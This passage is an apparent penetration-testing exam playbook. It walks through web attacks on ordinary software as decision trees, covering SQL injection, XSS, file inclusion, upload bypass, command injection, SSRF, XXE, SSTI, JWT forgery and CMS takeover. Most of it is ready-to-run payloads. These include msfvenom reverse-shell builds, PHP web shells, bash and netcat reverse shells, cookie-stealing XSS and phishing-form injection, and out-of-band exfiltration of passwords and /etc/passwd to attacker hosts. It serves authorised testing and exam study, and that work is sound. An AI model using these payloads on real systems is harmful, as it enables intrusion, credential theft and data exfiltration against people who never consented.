- IF Tomcat (`/manager/html`, `Apache Tomcat`):
  ```bash
  curl -i -u tomcat:tomcat http://<host>:8080/manager/html
  # Default creds: tomcat/tomcat, admin/admin, tomcat/s3cret
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=<lhost> LPORT=4444 -f war > shell.war
  curl -u tomcat:<pass> --upload-file shell.war "http://<host>:8080/manager/text/deploy?path=/shell"
  curl http://<host>:8080/shell/
  ```

- IF Jenkins → /script (Groovy console) for RCE if creds.
- IF Splunk → upload malicious app for RCE if admin.


### 2.4 Burp Suite / ZAP (Proxy Workflow)

#### 2.4.1 First-time setup

```text
1) Burp → Proxy → Options → Intercept Off
2) Browser → set proxy 127.0.0.1:8080 (or use Burp's embedded Chromium)
3) Visit http://burp → Download CA cert → import into browser as Trusted Root
4) Set Target → Scope → only your in-scope domains/IPs
```

#### 2.4.2 Manual testing flow

```text
Proxy → click through entire app                    (populates Target)
Target → Scope → tick "Show only in-scope items"
Target → Site map → right-click each interesting request → "Send to Repeater"
Repeater → modify each parameter / header / method
For complex iteration → "Send to Intruder"
```

#### 2.4.3 Burp Intruder — 4 attack types

| Attack type | Payload sets | Use case |
| --- | --- | --- |
| **Sniper** | 1 set, hits one position at a time | Test each parameter individually |
| **Battering Ram** | 1 set, same value all positions | Same value in multiple places |
| **Pitchfork** | 1 set per position, parallel | Username:Password pairing |
| **Cluster Bomb** | 1 set per position, cartesian | User × Password permutations |

```text
1) Send request to Intruder
2) Clear payload positions; mark only the field(s) to fuzz with §
3) Pick attack type
4) Payloads tab → load wordlist
5) Settings → Grep – Match → "incorrect" / "invalid" to filter
6) Start Attack → sort by Length / Status
```

#### 2.4.4 Match & Replace (auto-modification)

```text
Proxy → Match and Replace → Add rule:
  - Match: User-Agent regex
  - Replace: New UA / SQLi probe / XSS canary
Apply to: requests
```

#### 2.4.5 Burp Scanner (Pro) / ZAP equivalent

```text
Burp:  Crawl (Spider) → Active Scan → Issues → Report
ZAP:   Spider → Active Scan → Alerts → Report
```

#### 2.4.6 ZAP Fuzzer (free Intruder alternative)

```text
1) Right-click request in History → Attack → Fuzz
2) Add Locations (the fields)
3) Add Payloads (file/strings/script)
4) Optional Processors (URL encode, base64)
5) Start → Sort by Code/Size/Time
```

#### 2.4.7 Useful BApp / ZAP add-ons

- **Logger++** — full request log with regex search
- **Autorize** — IDOR / authorization checking
- **Param Miner** — hidden parameter discovery
- **Hackvertor** — fast encoding/transformation
- **Active Scan++** — extra scan checks
- **Collaborator** (Pro) / OAST Server — OOB testing

#### 2.4.8 Burp Collaborator / OAST — Out-of-Band Testing

**When to use OOB:** blind SSRF, blind XXE, blind SQLi (DNS exfil), blind command injection, DNS exfiltration.

**Free alternatives (no Burp Pro needed):**
```bash
interactsh-client          # install: go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
# Gives you: <random>.oast.pro — every DNS/HTTP/SMTP hit appears in terminal
```
Also: `canarytokens.org`, `webhook.site`, `oast.pro`

**OOB payload patterns:**
```bash
# Blind XXE:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://<collab>">]><root>&xxe;</root>
# Or external DTD:
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<collab>/dtd"> %xxe;]>

# Blind command injection:
; nslookup <collab> ;
; curl http://<collab>/$(whoami) ;
`nslookup <collab>`
$(curl http://<collab>/`id`)

# SQLi DNS exfil — MSSQL:
'; EXEC master..xp_dirtree '\\<collab>\share'--
'; EXEC master..xp_cmdshell 'nslookup <collab>'--

# SQLi DNS exfil — Oracle:
SELECT UTL_HTTP.REQUEST('http://<collab>/'||(SELECT password FROM users WHERE rownum=1)) FROM dual;
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT username FROM users WHERE rownum=1)||'.<collab>') FROM dual;

# SQLi DNS exfil — MySQL (if FILE priv):
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.<collab>\\share'));

# Blind SSRF:
url=http://<collab>/
X-Forwarded-For: http://<collab>/
```

**Workflow:**
1. Copy collaborator subdomain (Burp: Collaborator tab → Copy to clipboard)
2. Inject `<collab>` into every blind injection candidate (all headers, all params)
3. Poll for DNS/HTTP hits — any hit confirms OOB
4. Use hit content (e.g., subdomain = exfiltrated data) for data extraction

---

> ✅ **GATE — Before §3 (Vuln ID)**: Must have:
> - [ ] Full TCP scan (`-p-`) output for every in-scope host
> - [ ] UDP top-100 scan for every host
> - [ ] `-sV -sC` service scan for every open port
> - [ ] Banner/version recorded for every service
> - [ ] All discovered hostnames added to `/etc/hosts`
> - [ ] Web tech fingerprint (`whatweb`) for every HTTP port
> - [ ] If AD in scope: SMB null/guest enum done, LDAP anon bind tested

---

## 3. Vulnerability Identification

Decision tree:

- IF service version known →
  ```bash
  searchsploit <product> <version>
  searchsploit -m <id>           # mirror to current dir
  # Cross-check NVD: nvd.nist.gov/vuln/search ; click PoC links
  ```
  Filter false positives — some EDB entries are DoS only.

- IF web app:
  - Manual test order: auth → IDOR → SQLi → XSS → file upload → command injection → SSRF → file inclusion → XXE → deserialization.
  - Automated (only if scope permits and time allows):
    ```bash
    nuclei -u http://<host>/ -severity medium,high,critical -o nuclei.txt
    nikto -h http://<host>/
    ```
  - Burp scanner Active scan only on authorised endpoints.

- IF AD environment → see §7.1 + automated:
  ```bash
  nxc ldap <dc-ip> -u <u> -p <p> --asreproast asrep.txt --kerberoasting kerb.txt
  bloodhound-python -d <dom> -u <u> -p <p> -ns <dc-ip> -c All --zip
  ```

- IF credentials found → run the **Credential Spray Matrix** (§4.3) against every host:
  ```bash
  nxc smb     <cidr> -u <u> -p '<p>'
  nxc winrm   <cidr> -u <u> -p '<p>'
  nxc ssh     <cidr> -u <u> -p '<p>'
  nxc ldap    <dc-ip> -u <u> -p '<p>'
  nxc mssql   <cidr> -u <u> -p '<p>'
  nxc rdp     <cidr> -u <u> -p '<p>'
  nxc ftp     <cidr> -u <u> -p '<p>'
  ```

- Tool selection:
  - **Nessus** — only if it was used in your prep and provided in the exam VM.
  - **Manual checks** — exam default, every time.
  - **searchsploit / exploit-db** — for known service versions.
  - **nuclei** — fast first-pass against web hosts (low risk).


### 3.5 Vulnerability Assessment Workflow

#### 3.5.1 CVSS Scoring (do this for every finding)

Use https://www.first.org/cvss/calculator/3.1 — never invent scores. **Always include the vector string in the report, not just the number.**

**CVSS v3.1 Base Metric breakdown:**

| Metric | Values | Meaning |
|--------|--------|---------|
| AV (Attack Vector) | N/A/L/P | Network / Adjacent / Local / Physical |
| AC (Attack Complexity) | L/H | Low / High |
| PR (Privileges Required) | N/L/H | None / Low / High |
| UI (User Interaction) | N/R | None / Required |
| S (Scope) | U/C | Unchanged / Changed (crosses security boundary) |
| C (Confidentiality) | N/L/H | None / Low / High |
| I (Integrity) | N/L/H | None / Low / High |
| A (Availability) | N/L/H | None / Low / High |

**Example — Default Tomcat Creds → RCE:**
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = **9.8 Critical**
- AV:N (exploitable over network), AC:L (no special conditions), PR:N (no auth), UI:N (no user click), S:U (same security boundary), C/I/A all High (full system compromise).

**Example — Stored XSS → session hijack:**
`CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N` = **5.4 Medium**
- PR:L (need to be logged in to store payload), UI:R (victim must visit page), S:C (crosses to victim's browser context).

> CVSS v4.0 released Nov 2023 — not yet required for CPTS but exists. v3.1 is current exam standard.

| Finding | Typical CVSSv3.1 base |
| --- | --- |
| Default creds + RCE | 9.8 (Critical) |
| Unauth RCE | 9.8 |
| Auth RCE | 8.8 |
| SQLi unauth | 9.8 |
| SQLi auth | 8.8 |
| Directory listing | 5.3 |
| Info disclosure (config) | 5.3 |
| Outdated software w/ known CVE | varies |
| Missing security headers | 4.3 |
| Self-XSS | 3.5 |
| Stored XSS | 6.1 |

#### 3.5.2 Nessus workflow

```text
1) /etc/init.d/nessusd start → https://localhost:8834
2) Policies → New Policy → "Advanced Scan"
   - Discovery → custom port range "1-65535"
   - Assessment → enable web app tests, thorough tests
   - Credentials → SSH/Windows for authenticated scan (much higher signal)
3) Scans → New Scan → use the policy → set Targets
4) Launch → wait
5) Export → HTML for client; Nessus DB for re-import; CSV for triage
6) Triage findings: read plugin output details to dismiss false positives
```

#### 3.5.3 OpenVAS / GVM workflow

```bash
sudo gvm-setup           # one-time
sudo gvm-start
# Web UI: https://127.0.0.1:9392
# Configuration → Targets → New (specify hosts)
# Scans → Tasks → New (pick target + scan config "Full and Fast")
# Run → Reports
```

#### 3.5.4 Manual prioritisation checklist (in lieu of vuln scanner)

- Critical → unauth RCE / SQLi / file upload to RCE
- High → auth RCE / DCSync prerequisites / weak creds on admin endpoints
- Medium → IDOR / XXE / SSRF / outdated software (no PoC)
- Low → info leaks / missing headers / verbose errors

---

> ✅ **GATE — Before §4 (Exploitation)**: Must have:
> - [ ] `searchsploit` run for every version banner
> - [ ] At least 2 candidate exploits per host (primary + fallback)
> - [ ] Web app manual test order started: auth → IDOR → SQLi → XSS → upload → cmdi → SSRF → LFI → XXE → deserial → SSTI
> - [ ] Vuln scanner output triaged (or manual priority checklist from §3.5.4)

---

## 4. Initial Access / Exploitation

### 4.1 Web Application Attacks

#### SQL Injection

Detection:
```text
1) Append ' " ` to every parameter — note error/500.
2) Boolean: ?id=1 AND 1=1 vs ?id=1 AND 1=2 — different responses → SQLi.
3) Time: ?id=1 AND SLEEP(5) — measurable delay.
```

- IF error visible (verbose DB errors) → **Error-based**:
  ```sql
  ' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
  ' AND (SELECT 1 FROM (SELECT COUNT(*),concat(version(),0x7e,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)y)-- -
  ```

- IF results are reflected → **UNION-based**:
  ```sql
  -- Find column count
  ' ORDER BY 1-- -    (raise until error)
  ' UNION SELECT NULL,NULL,NULL-- -
  -- Find string columns
  ' UNION SELECT 'a',NULL,NULL-- -
  -- Enumerate
  ' UNION SELECT table_name,column_name,NULL FROM information_schema.columns WHERE table_schema=database()-- -
  ' UNION SELECT user,password,NULL FROM users-- -
  ```

- IF same response always → **Boolean Blind**:
  ```text
  ' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a'-- -
  ```

- IF no visible output and no error → **Time-Based Blind**:
  ```sql
  ' AND IF(SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a',SLEEP(3),0)-- -
  ```

- IF DNS exfil possible (MSSQL/MySQL/Oracle with outbound DNS) → **Out-of-Band**:
  ```sql
  -- MSSQL
  ;DECLARE @x VARCHAR(8000);SELECT @x=db_name();EXEC('master..xp_dirtree "\\'+@x+'.<collab>.oastify.com\a"');
  ```

- **SQLMap** for everything you don't want to do by hand:
  ```bash
  # Save the request from Burp → request.txt, then:
  sqlmap -r request.txt --batch --dbs
  sqlmap -r request.txt -D <db> --tables
  sqlmap -r request.txt -D <db> -T <table> --dump
  sqlmap -r request.txt --os-shell                 # if --is-dba and stack queries
  sqlmap -r request.txt --file-read=/etc/passwd
  sqlmap -r request.txt --file-write=shell.php --file-dest=/var/www/html/sh.php
  sqlmap -r request.txt --tamper=space2comment,between --level 5 --risk 3 --random-agent
  sqlmap -r request.txt --csrf-token=<token> --csrf-url=<csrf-url>
  ```

**SQLMap Scenario Templates (copy-paste for 8 exam scenarios):**
```bash
# 1. GET parameter (basic)
sqlmap -u "http://target/page?id=1" --batch --dbs

# 2. POST with Burp request file
sqlmap -r req.txt --batch --dbs

# 3. POST + CSRF token
sqlmap -r req.txt --csrf-token=csrf_token --csrf-url=http://target/login --batch --dbs

# 4. Cookie-based injection
sqlmap -u "http://target/" --cookie="PHPSESSID=abc; admin=true" --level=2 --batch --dbs

# 5. Header injection (User-Agent / Referer)
sqlmap -u "http://target/" --user-agent="*" --batch --dbs
sqlmap -u "http://target/" --referer="*" --batch --dbs

# 6. Time-based blind only
sqlmap -u "http://target/?id=1" --technique=T --time-sec=5 --batch --dbs

# 7. WAF bypass with tampers
sqlmap -r req.txt --tamper=space2comment,between,charunicodeencode \
  --random-agent --level=5 --risk=3 --batch

# 8. Authenticated + multi-step
sqlmap -u "http://target/profile?id=1" --auth-type=basic --auth-cred="user:pass" --batch
# Or with session cookie captured from curl:
sqlmap -u "http://target/profile?id=1" \
  --cookie="$(curl -s -c - http://target/login -d 'u=admin&p=pass' | grep PHP | awk '{print $7"="$8}')" --batch
```
> ⚠️ `--os-shell` is loud. Only use after `--is-dba` confirms DBA privilege. Avoid on exam unless needed for flag.

#### XSS

- Reflected — try in every parameter:
  ```html
  "><script>alert(1)</script>
  '"><img src=x onerror=alert(1)>
  javascript:alert(1)
  ```
- Stored — submit in profile / comments / file upload metadata. Check page where it's rendered.
- DOM — view source, find `document.write`, `innerHTML`, `eval`, `location.hash`.

- Session steal payload:
  ```html
  <script>fetch('http://<lhost>/?c='+document.cookie)</script>
  <script src="http://<lhost>/x.js"></script>
  ```
- Phishing/credential harvest payload (replace login form):
  ```html
  <script>document.body.innerHTML='<form action="http://<lhost>/log" method="POST"><input name=u><input name=p type=password><input type=submit></form>'</script>
  ```

#### File Inclusion (LFI / RFI)

Detection: `?page=../../../etc/passwd` → if `root:x:0:0` returned → LFI.

- Path traversal variants (try each):
  ```
  ../../../etc/passwd
  ....//....//....//etc/passwd        # doubled
  ..%2f..%2f..%2fetc/passwd           # URL-encoded
  ..%252f..%252fetc/passwd            # double URL-encoded
  /etc/passwd                          # absolute
  /var/www/html/../../etc/passwd
  ```

- IF appended extension (e.g., `?page=X.php`) → null byte (PHP < 5.3.4) or wrappers:
  ```
  ?page=../../../etc/passwd%00
  ?page=php://filter/convert.base64-encode/resource=index
  ```

- IF PHP wrappers work → source disclosure:
  ```
  ?page=php://filter/convert.base64-encode/resource=../../../etc/hosts
  ?page=php://filter/convert.base64-encode/resource=index
  ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id
  ?page=expect://id                   (rare; expect:// extension)
  ```

- IF `allow_url_include = On` → **RFI**:
  ```
  ?page=http://<lhost>/shell.txt        # contains <?php system($_GET['c']); ?>
  ```
  Host with `python3 -m http.server 80`.

- **Log poisoning** (when LFI but no upload, no RFI):
  ```text
  1) Inject PHP into User-Agent header: curl -A "<?php system(\$_GET['c']); ?>" http://<host>/
  2) Include the access log: ?page=/var/log/apache2/access.log&c=id
  3) Or SSH log: ssh '<?php system($_GET["c"]); ?>'@<host>  → ?page=/var/log/auth.log
  ```

- **PHAR/Phar deserialisation upload**:
  ```bash
  # Build phar with payload, upload as image
  ?page=phar:///var/www/uploads/avatar.jpg/test
  ```

#### File Upload

Detection: every form/input that accepts files.

- IF no validation → upload `.php` / `.aspx` / `.jsp` directly:
  ```php
  <?php system($_GET['c']); ?>
  ```
  Then `curl http://<host>/uploads/sh.php?c=id`.

- IF extension blacklist → bypass:
  ```
  shell.phtml  shell.php3  shell.php5  shell.php7  shell.phps
  shell.pHp    shell.PhP  (case)
  shell.php.png  shell.png.php   (double ext, depends on parser)
  shell.php%00.png   (null byte, old)
  shell.php;.jpg     (IIS ;)
  shell.asp;.jpg     (classic IIS)
  shell.phar  shell.inc
  ```

- IF whitelist on extension only → check Content-Type / magic bytes:
  - Add valid magic bytes:
    ```bash
    printf '\xff\xd8\xff\xe0' > shell.jpg.php
    cat <<'EOF' >> shell.jpg.php
    <?php system($_GET['c']); ?>
    EOF
    ```
  - Burp: change `Content-Type: image/jpeg` after upload.

- IF whitelist + content sniff strict → image polyglot:
  ```bash
  exiftool -Comment='<?php system($_GET["c"]); ?>' real.jpg
  mv real.jpg shell.php.jpg
  # Combine with LFI for execution
  ```

- IF SVG accepted → XSS / XXE via SVG:
  ```xml
  <svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
  ```

- Web shell payload selection:
  ```bash
  # PHP one-liner
  echo '<?php system($_GET["c"]); ?>' > sh.php
  # ASPX (msfvenom)
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=4444 -f aspx > sh.aspx
  # JSP
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=<lhost> LPORT=4444 -f raw > sh.jsp
  # WAR (Tomcat)
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=<lhost> LPORT=4444 -f war > sh.war
  ```

#### Command Injection

Detection: `;`, `|`, `&`, `&&`, `||`, backticks, `$()` in any parameter.

- Test each separator:
  ```
  ; id ;       | id |       & id &       && id        || id
  `id`        $(id)          %0aid%0a    (newline)
  ```
- IF char-blacklist:
  ```
  ;${IFS}id${IFS};         (Linux IFS)
  ;cat${IFS}/etc/passwd
  c""at /et""c/pas""swd     (concat)
  cat$u /etc/passwd          (var expansion)
  /bin/c?t /etc/p?sswd       (glob)
  /???/??t /???/p??swd
  ```
- Encoding bypass (Bashfuscator-style — covered in notes):
  ```bash
  echo cat /etc/passwd | base64    → bash<<<$(base64 -d<<<<base64-blob>)
  $(printf '\143\141\164')         → octal
  ```
- Reverse shell payload:
  ```
  ; bash -c 'bash -i >& /dev/tcp/<lhost>/4444 0>&1'
  ; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <lhost> 4444 >/tmp/f
  ```

#### SSRF

Detection: any input that becomes a URL (image fetcher, webhook, PDF generator, link preview).

- Test:
  ```
  http://127.0.0.1/      http://localhost:80/admin
  http://169.254.169.254/latest/meta-data/      (AWS IMDS)
  gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET ...   (Redis)
  file:///etc/passwd       dict://127.0.0.1:11211/stats
  ```
- DNS rebinding / IP encoding bypasses:
  ```
  http://2130706433/        (decimal 127.0.0.1)
  http://0177.0.0.1/        (octal)
  http://127.1/             (short)
  http://example.com.@127.0.0.1/
  http://localhost%23.example.com/
  ```

#### Broken Authentication / Session

- Cookie predictability — base64/sequential IDs (see IDOR).
- JWT — try `alg:none`, weak HMAC secret:
  ```bash
  hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
  ```
- Session fixation — supply a known PHPSESSID, get victim to authenticate.
- Default creds — admin:admin, root:root, tomcat:tomcat, etc.

#### XXE

Detection: any XML-accepting endpoint (SOAP, SAML, OOXML upload, RSS feeds, XML API).

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><x>&xxe;</x></root>
```
- IF response visible → file read directly.
- IF blind → out-of-band:
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://<lhost>/x.dtd"> %xxe; ]>
  ```
  And on lhost serve `x.dtd`:
  ```xml
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % wrapper "<!ENTITY &#x25; send SYSTEM 'http://<lhost>/?d=%file;'>">
  %wrapper; %send;
  ```

#### Insecure Deserialization

- PHP — `__wakeup`/`__destruct` on unserialize input. Build a Phar/serialized object using `phpggc`:
  ```bash
  phpggc Symfony/RCE4 system 'id' -b   # base64 chain
  ```
- Java — Look for `readObject`. Build with `ysoserial`:
  ```bash
  java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,base64-payload}|{base64,-d}|{bash,-i}' | base64
  ```
- .NET — `ysoserial.net`.

#### IDOR

- Any endpoint with numeric/UUID IDs:
  ```
  /api/user/1234/profile        → try /1233, /1235
  /file?id=AABB                 → decode/encrypt? compare role responses
  ```
- Mass enumeration with ffuf:
  ```bash
  ffuf -u "http://<host>/api/user/FUZZ/profile" -w <(seq 1 5000) -mc 200 -fs <baseline> -H "Authorization: Bearer <token>"
  ```


#### SSTI (Server-Side Template Injection)

**Detection — inject into every reflected parameter/header:**
```
{{7*7}}      → 49? → Jinja2 or Twig
${7*7}       → 49? → Freemarker, Velocity, EL
<%= 7*7 %>   → 49? → ERB (Ruby)
#{7*7}       → 49? → Smarty
*{7*7}       → 49? → Thymeleaf
```

**Engine fingerprinting decision tree:**
```
{{7*7}} works?
  ├─ {{7*'7'}} = '7777777'? → Jinja2
  └─ {{7*'7'}} = 49?        → Twig
${7*7} works?
  ├─ Java app?  → Freemarker/Velocity/EL
  └─ Ruby app?  → ERB uses <%= %>
```

**RCE payloads per engine:**
```python
# Jinja2 (Python)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()[0].strip()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# ERB (Ruby)
<%= `id` %>
```

**Tool:** `tplmap -u "http://target/?param=*"` — auto-detects engine + exploits.

→ Next: shell via `tplmap --os-shell` or manual `curl` reverse shell payload.

---

#### PHP Type Juggling

**Magic hash bypass (loose `==` comparison):**
```php
# Strings starting with "0e" followed by digits compare == 0 in PHP
# Common magic hashes:
240610708  → MD5: 0e462097431906509019562988736854
QNKCDZO    → MD5: 0e830400451993494058024219903391
aabg74fkjmop5lv → SHA1: 0e400751161259...
# Attack: if app does md5($pass) == $stored, send a magic-hash password
```

**Loose comparison login bypass:**
```
password[]=   # array breaks strict type check
username=admin&password[]=anything   # POST body
```

**`===` vs `==` summary:** `==` performs type coercion; `===` checks type+value. Auth bypass only works against `==`.

→ Next: login as admin, then exploit session.

---

#### HTTP Verb Tampering

**Test order:** POST → GET → PUT → DELETE → PATCH → HEAD → OPTIONS → TRACE

```bash
# Burp: change Method in request editor
# Or curl:
curl -X PUT http://target/admin/
curl -X HEAD http://target/protected/
curl -X OPTIONS http://target/ -v   # see Allow: header

# If Apache .htaccess blocks POST but not GET:
# <Limit POST> → only POST is blocked, GET bypasses
curl -X GET http://target/admin/deleteuser?id=5

# Override header (proxy bypass):
curl -X POST http://target/admin/ -H "X-HTTP-Method-Override: GET"
curl -X POST http://target/admin/ -H "X-HTTP-Method: DELETE"
```

→ Next: if verb allowed, exploit same endpoint with different method.

---

#### CSRF (Cross-Site Request Forgery)

**Detection:**
- No `CSRF-Token` / `__RequestVerificationToken` in form
- Token present but not validated server-side (submit any value)
- Token tied to session but not per-request (reuse old token)

**PoC auto-submit form:**
```html
<html><body>
<form id="f" action="http://target/changemail" method="POST">
  <input name="email" value="attacker@evil.com"/>
</form>
<script>document.getElementById('f').submit();</script>
</body></html>
```

**CSRF bypass techniques:**
- `SameSite=None; Secure` cookie + cross-site POST
- Missing `Origin` / `Referer` check → set empty referer: `curl -e ""`
- Token in URL parameter instead of body → easier to leak via `Referer`
- JSONP endpoint → GET request with callback → CSRF for GET-based state changes

→ Next: host PoC, test with victim session cookie.

---

#### Open Redirect

**Payloads (test all in redirect/return/next/url parameters):**
```
?url=//evil.com
?next=https:evil.com
?return=///evil.com
?redirect=https://evil.com%2F@target.com   # URL auth bypass
?url=http://target@evil.com
?url=%2F%2Fevil.com
?url=\evil.com                             # backslash bypass
```

**Chain to OAuth token theft:**
```
# If OAuth redirect_uri validates only prefix:
redirect_uri=https://target.com/callback/../../../open-redirect?url=https://evil.com
# → OAuth sends code to evil.com
```

→ Next: chain with XSS, OAuth, or phishing.

---

#### NoSQL Injection (MongoDB)

**Auth bypass payloads:**
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$ne": "wrongpass"}}
```

**HTTP POST injection (JSON body):**
```bash
curl -s -X POST http://target/login -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'
```

**URL parameter injection:**
```
?user[$ne]=&pass[$ne]=    # PHP/Express array syntax
?user=admin&pass[$gt]=    # bypass numeric comparison
```

**JS injection (if MongoDB `$where` used):**
```
username=admin'; return true; var x='
```

**Tool:** `nosqlmap -u "http://target/login" --attack 0`

→ Next: enumerate collections with `$regex` injection.

---

#### JWT Attacks (expanded)

**alg:none — strip signature:**
```python
import base64, json
header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({"user":"admin","role":"admin"}).encode()).decode().rstrip('=')
token = f"{header}.{payload}."   # empty signature
```

**HMAC weak secret cracking:**
```bash
hashcat -a 0 -m 16500 <jwt_token> /usr/share/wordlists/rockyou.txt
john --format=jwt <jwt_file>
```

**jku / jwk header injection:**
```json
// Forge header with jku pointing to your server hosting a JWK set:
{"alg":"RS256","typ":"JWT","jku":"https://evil.com/jwks.json"}
```

**kid header path traversal:**
```json
{"alg":"HS256","kid":"../../dev/null"}
// Sign with empty secret (null byte file)
```

**Tool:** `jwt_tool <token> -T` (tamper mode) / `jwt_tool <token> -C -d rockyou.txt` (crack)

```bash
python3 jwt_tool.py <token> -X a      # alg:none
python3 jwt_tool.py <token> -X s      # self-sign (jwk)
python3 jwt_tool.py <token> -X k -pk attacker.pem   # key confusion RS→HS
```

→ Next: use forged token in Authorization header.

---

#### GraphQL

**Detection endpoints:** `/graphql`, `/v1/graphql`, `/api/graphql`, `/graphiql`, `/playground`

**Introspection query (enumerate schema):**
```bash
curl -s -X POST http://target/graphql -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'

# Full schema dump:
curl -s -X POST http://target/graphql -H "Content-Type: application/json" \
  -d '{"query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}"}'
```

**Attack vectors:**
```bash
# IDOR via GraphQL
{"query":"{ user(id: 1) { name email password } }"}

# Batch query abuse (bypass rate limit)
[{"query":"{ login(user:\"a\",pass:\"a\") }"},{"query":"{ login(user:\"a\",pass:\"b\") }"}]

# Mutation (modify data)
{"query":"mutation { updateUser(id:2, role:\"admin\") { id role } }"}
```

**Tools:**
- `InQL` (Burp extension) — auto schema dump + query builder
- `graphql-cop -t http://target/graphql` — security audit
- `clairvoyance` — guess schema without introspection

→ Next: use schema to find sensitive mutations/queries.

---

#### API Testing (expanded)

**REST vs GraphQL vs gRPC detection:**
```bash
# REST: JSON responses, /api/v1/resource paths
# GraphQL: single endpoint + POST {"query":"..."} or introspection responds
# gRPC: HTTP/2, binary protobuf, port 50051 common
#   → grpcurl -plaintext target:50051 list   # enumerate services
```

**Method override headers (WAF/proxy bypass):**
```
X-HTTP-Method-Override: DELETE
X-HTTP-Method: PUT
X-Method-Override: PATCH
```

**Mass assignment attack:**
```bash
# Add unexpected fields to registration/update:
POST /api/user {"name":"attacker","email":"a@b.com","role":"admin","isAdmin":true}
# If app blindly binds all body fields to ORM model → privilege escalation
```

**Rate limit bypass via header rotation:**
```bash
# Try rotating:
X-Forwarded-For: 1.2.3.4   # increment per request
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
# Burp Intruder: Pitchfork, rotate IP + credentials
```

→ Next: document each endpoint + verb tested in notes.

---

#### 4.1.A Application-Specific Attack Trees

##### 13.1 WordPress

#### Discovery
- IF `wp-login.php`, `wp-content/`, `wp-` cookies visible → confirmed.
- Version: `curl -s http://<h>/ | grep -oP 'content="WordPress \K[0-9.]+'` or wpscan.

#### Enumeration
```bash
wpscan --url http://<h>/ --enumerate u,vp,vt,cb,dbe,m -e u1-50 \
       --api-token <token> --random-user-agent --plugins-detection aggressive -o wpscan.txt
# User enum (via author scan even if hidden)
curl -s "http://<h>/?author=1" -I | grep -i location          # /author/<username>
curl -s "http://<h>/wp-json/wp/v2/users"                       # REST API user list
```

#### Attack Decision Tree
- IF default/weak admin creds → wp-login bruteforce:
  ```bash
  wpscan --url http://<h>/ --usernames admin,wordpress --passwords rockyou.txt --max-threads 20
  hydra -L users.txt -P rockyou.txt <h> http-post-form \
        '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect' -t 10
  ```
- IF admin shell → edit theme:
  ```text
  Appearance → Theme Editor → Pick the active theme → Edit 404.php
  Replace contents with: <?php system($_GET['c']); ?>
  Visit: http://<h>/wp-content/themes/<theme>/404.php?c=id
  ```
- IF outdated plugin with known RCE → metasploit:
  ```bash
  msfconsole -qx "search type:exploit wordpress"
  ```
- High-impact CVEs to check: WP File Manager (CVE-2020-25213), WP GDPR (CVE-2018-19207), Duplicator (CVE-2020-11738), various RCE plugins.

##### 13.2 Joomla

```bash
curl -s http://<h>/administrator/manifests/files/joomla.xml | grep version
curl -s http://<h>/language/en-GB/en-GB.xml | grep version
joomscan -u http://<h>/
droopescan scan joomla -u http://<h>/
```
- IF admin login → Templates → edit error.php / index.php → drop webshell.
- CVEs: CVE-2017-8917 (SQLi unauth), CVE-2019-10945 (auth dir traversal), CVE-2023-23752 (unauth API config disclosure).

##### 13.3 Drupal

```bash
droopescan scan drupal -u http://<h>/
curl -s http://<h>/CHANGELOG.txt | head
# IF Drupal < 7.58 / 8.5.1 → Drupalgeddon2 (CVE-2018-7600)
msfconsole -qx "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS <h>; run"
```
- IF authenticated as admin: Modules → enable PHP filter (Drupal ≤ 7) → create page with PHP. Newer Drupal: upload backdoored module via Modules → Install.

##### 13.4 Tomcat

```bash
# Version
curl -s -i http://<h>:8080/ | grep -i 'Server:'
